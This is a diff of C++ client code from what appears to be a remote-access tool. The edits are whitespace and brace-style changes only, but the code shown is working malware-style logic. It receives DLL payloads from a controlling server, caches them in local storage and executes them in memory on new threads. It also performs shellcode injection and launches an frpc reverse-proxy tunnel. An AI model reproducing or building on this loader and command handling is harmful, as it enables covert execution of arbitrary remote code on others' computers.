@@ -142,7 +142,8 @@ BOOL WriteBinaryToFile(const char* data, ULONGLONG size, const char* name = "Ser
 }
 
 template <typename T = DllExecuteInfo>
-class DllExecParam {
+class DllExecParam
+{
 public:
     T *info;
     PluginParam param;
@@ -184,14 +185,14 @@ public:
 };
 
 typedef int (*RunSimpleTcpFunc)(
-	const char* privilegeKey,
-	long timestamp,
-	const char* serverAddr,
-	int serverPort,
-	int localPort,
-	int remotePort,
-	int* statusPtr
-	);
+    const char* privilegeKey,
+    long timestamp,
+    const char* serverAddr,
+    int serverPort,
+    int localPort,
+    int remotePort,
+    int* statusPtr
+);
 
 DWORD WINAPI ExecuteDLLProc(LPVOID param)
 {
@@ -229,14 +230,14 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
             FrpcParam* f = (FrpcParam*)user;
             if (proc) {
                 Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
-                int r=proc(f->privilegeKey, f->timestamp, f->serverAddr, f->serverPort, f->localPort, f->remotePort, 
-                    &CKernelManager::g_IsAppExit);
+                int r=proc(f->privilegeKey, f->timestamp, f->serverAddr, f->serverPort, f->localPort, f->remotePort,
+                           &CKernelManager::g_IsAppExit);
                 if (r) {
-					char buf[100];
-					sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
-					Mprintf("%s\n", buf);
-					ClientMsg msg("代理端口", buf);
-					This->SendData((LPBYTE)&msg, sizeof(msg));
+                    char buf[100];
+                    sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
+                    Mprintf("%s\n", buf);
+                    ClientMsg msg("代理端口", buf);
+                    This->SendData((LPBYTE)&msg, sizeof(msg));
                 }
             }
             SAFE_DELETE_ARRAY(user);
@@ -246,7 +247,7 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
             break;
         }
         if (info.CallType != CALLTYPE_FRPC_CALL)
-        runner->FreeLibrary(module);
+            runner->FreeLibrary(module);
     } else if (info.RunType == SHELLCODE) {
         bool flag = info.CallType == CALLTYPE_IOCPTHREAD;
         ShellcodeInj inj(dll->buffer, info.Size, flag ? "run" : 0, flag ? &pThread : 0, flag ? sizeof(PluginParam) : 0);
@@ -568,46 +569,47 @@ std::string getHardwareIDByCfg(const std::string& pwdHash, const std::string& ma
 }
 
 template<typename T = DllExecuteInfo>
-BOOL ExecDLL(CKernelManager *This, PBYTE szBuffer, ULONG ulLength, void *user) {
-	static std::map<std::string, std::vector<BYTE>> m_MemDLL;
-	const int sz = 1 + sizeof(T);
-	if (ulLength < sz) return FALSE;
-	const T* info = (T*)(szBuffer + 1);
-	const char* md5 = info->Md5;
-	auto find = m_MemDLL.find(md5);
-	if (find == m_MemDLL.end() && ulLength == sz) {
-		iniFile cfg(CLIENT_PATH);
-		auto md5 = cfg.GetStr("settings", info->Name + std::string(".md5"));
-		if (md5.empty() || md5 != info->Md5 || !This->m_conn->IsVerified()) {
-			// 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
+BOOL ExecDLL(CKernelManager *This, PBYTE szBuffer, ULONG ulLength, void *user)
+{
+    static std::map<std::string, std::vector<BYTE>> m_MemDLL;
+    const int sz = 1 + sizeof(T);
+    if (ulLength < sz) return FALSE;
+    const T* info = (T*)(szBuffer + 1);
+    const char* md5 = info->Md5;
+    auto find = m_MemDLL.find(md5);
+    if (find == m_MemDLL.end() && ulLength == sz) {
+        iniFile cfg(CLIENT_PATH);
+        auto md5 = cfg.GetStr("settings", info->Name + std::string(".md5"));
+        if (md5.empty() || md5 != info->Md5 || !This->m_conn->IsVerified()) {
+            // 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
             This->m_ClientObject->Send2Server((char*)szBuffer, ulLength);
             return TRUE;
-		}
-		Mprintf("Execute local DLL from registry: %s\n", md5.c_str());
-		binFile bin(CLIENT_PATH);
-		auto local = bin.GetStr("settings", info->Name + std::string(".bin"));
-		const BYTE* bytes = reinterpret_cast<const BYTE*>(local.data());
-		m_MemDLL[md5] = std::vector<BYTE>(bytes + sz, bytes + sz + info->Size);
-		find = m_MemDLL.find(md5);
-	}
-	BYTE* data = find != m_MemDLL.end() ? find->second.data() : NULL;
-	if (info->Size == ulLength - sz) {
-		if (md5[0]) {
-			m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
-			iniFile cfg(CLIENT_PATH);
-			cfg.SetStr("settings", info->Name + std::string(".md5"), md5);
-			binFile bin(CLIENT_PATH);
-			std::string buffer(reinterpret_cast<const char*>(szBuffer), ulLength);
-			bin.SetStr("settings", info->Name + std::string(".bin"), buffer);
-			Mprintf("Save DLL to registry: %s\n", md5);
-		}
-		data = szBuffer + sz;
-	}
-	if (data) {
-		PluginParam param(This->m_conn->ServerIP(), This->m_conn->ServerPort(), &This->g_bExit, user);
-		CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam<T>(*info, param, data, This), 0, NULL));
-		Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
-	}
+        }
+        Mprintf("Execute local DLL from registry: %s\n", md5.c_str());
+        binFile bin(CLIENT_PATH);
+        auto local = bin.GetStr("settings", info->Name + std::string(".bin"));
+        const BYTE* bytes = reinterpret_cast<const BYTE*>(local.data());
+        m_MemDLL[md5] = std::vector<BYTE>(bytes + sz, bytes + sz + info->Size);
+        find = m_MemDLL.find(md5);
+    }
+    BYTE* data = find != m_MemDLL.end() ? find->second.data() : NULL;
+    if (info->Size == ulLength - sz) {
+        if (md5[0]) {
+            m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
+            iniFile cfg(CLIENT_PATH);
+            cfg.SetStr("settings", info->Name + std::string(".md5"), md5);
+            binFile bin(CLIENT_PATH);
+            std::string buffer(reinterpret_cast<const char*>(szBuffer), ulLength);
+            bin.SetStr("settings", info->Name + std::string(".bin"), buffer);
+            Mprintf("Save DLL to registry: %s\n", md5);
+        }
+        data = szBuffer + sz;
+    }
+    if (data) {
+        PluginParam param(This->m_conn->ServerIP(), This->m_conn->ServerPort(), &This->g_bExit, user);
+        CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam<T>(*info, param, data, This), 0, NULL));
+        Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
+    }
     return data != NULL;
 }
 
@@ -741,7 +743,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         }
         break;
     }
-	case CMD_EXECUTE_DLL_NEW: {
+    case CMD_EXECUTE_DLL_NEW: {
         if (sizeof(szBuffer) == 4) {
             Mprintf("CKernelManager ExecDLL failed: NOT x64 client\n");
             break;
@@ -750,11 +752,11 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         char* user = info ? new char[400] : 0;
         if (user == NULL) break;;
         if (info) memcpy(user, info->Parameters, 400);
-		if (!ExecDLL<DllExecuteInfoNew>(this, szBuffer, ulLength, user)) {
-			Mprintf("CKernelManager ExecDLL failed: received %d bytes\n", ulLength);
-		}
-		break;
-	}
+        if (!ExecDLL<DllExecuteInfoNew>(this, szBuffer, ulLength, user)) {
+            Mprintf("CKernelManager ExecDLL failed: received %d bytes\n", ulLength);
+        }
+        break;
+    }
 
     case TOKEN_PRIVATESCREEN: {
         char h[100] = {};
@@ -960,7 +962,8 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     }
 }
 
-void CKernelManager::OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength) {
+void CKernelManager::OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength)
+{
     if (ulLength > 8) {
         uint64_t n = 0;
         memcpy(&n, szBuffer + 1, sizeof(uint64_t));
@@ -994,8 +997,8 @@ int AuthKernelManager::SendHeartbeat()
     auto passCode = THIS_CFG.GetStr("settings", "Password", "");
     auto pwdHmac = THIS_CFG.GetStr("settings", "PwdHmac", "");
     uint64_t value = std::strtoull(pwdHmac.c_str(), nullptr, 10);
-	strcpy_s(a.SN, SN.c_str());
-	strcpy_s(a.Passcode, passCode.c_str());
+    strcpy_s(a.SN, SN.c_str());
+    strcpy_s(a.Passcode, passCode.c_str());
     memcpy(&a.PwdHmac, &value, 8);
 
     BYTE buf[sizeof(Heartbeat) + 1];
@@ -1005,19 +1008,19 @@ int AuthKernelManager::SendHeartbeat()
     return 0;
 }
 
-void AuthKernelManager::OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength) {
+void AuthKernelManager::OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength)
+{
     if (ulLength > sizeof(HeartbeatACK)) {
         HeartbeatACK n = { 0 };
         memcpy(&n, szBuffer + 1, sizeof(HeartbeatACK));
         m_nNetPing.update_from_sample(GetUnixMs() - n.Time);
         if (n.Authorized == TRUE) {
-			Mprintf("======> Client authorized successfully.\n");
-			// Once the client is authorized, authentication is no longer needed
-			// So we can set exit flag to terminate the AuthKernelManager
+            Mprintf("======> Client authorized successfully.\n");
+            // Once the client is authorized, authentication is no longer needed
+            // So we can set exit flag to terminate the AuthKernelManager
             g_bExit = S_CLIENT_EXIT;
         }
-    }
-    else if (ulLength > 8) {
+    } else if (ulLength > 8) {
         uint64_t n = 0;
         memcpy(&n, szBuffer + 1, sizeof(uint64_t));
         m_nNetPing.update_from_sample(GetUnixMs() - n);
